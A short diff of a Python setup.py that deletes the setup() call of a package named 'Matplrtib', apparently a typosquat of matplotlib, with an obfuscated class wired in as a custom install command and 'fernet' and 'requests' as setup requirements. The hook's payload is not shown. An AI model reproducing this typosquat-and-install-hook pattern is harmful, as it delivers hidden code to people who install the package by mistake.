@@ -18,22 +18,5 @@ class BDfDhLQfMxHyXyLkJzeGiJoQMsFtLfwujibdnXULeGnOHzcCLPictCadgMLPEyLGPMzraotvZo
             install.run(self)
 
 
-setup(
-    name="Matplrtib",
-    version=VERSION,
-    author="GvDXWBkxwbDNUZO",
-    author_email="YCMVLoN@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': BDfDhLQfMxHyXyLkJzeGiJoQMsFtLfwujibdnXULeGnOHzcCLPictCadgMLPEyLGPMzraotvZoOzwSUrcnHHXMDSBIyOOCOxOhadCnBIzWemkIlxwkCvwsTluFLfrUdjeHoSoOfUueSwLwi,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
